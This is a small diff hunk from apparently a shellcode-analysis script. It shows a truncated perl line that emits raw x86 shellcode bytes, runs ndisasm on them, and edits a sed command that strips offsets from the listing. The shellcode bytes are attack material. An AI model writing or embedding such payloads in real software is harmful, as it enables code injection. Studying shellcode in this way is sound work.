@@ -16,7 +16,7 @@ perl -e 'print "\x31\xC0\x50\x68\x71\x71\x79\x73\x68\x74\x20\x75\x78\x68\x74\x74
 
 ndisasm -b 32 shellcode > shellcode.asm
 
-sed -i 's/^............................//' shellcode.asm > shellcode.asm1
+sed -i 's/^............................//' shellcode.asm > shellcode.asm
 
 prepend:
 global _start
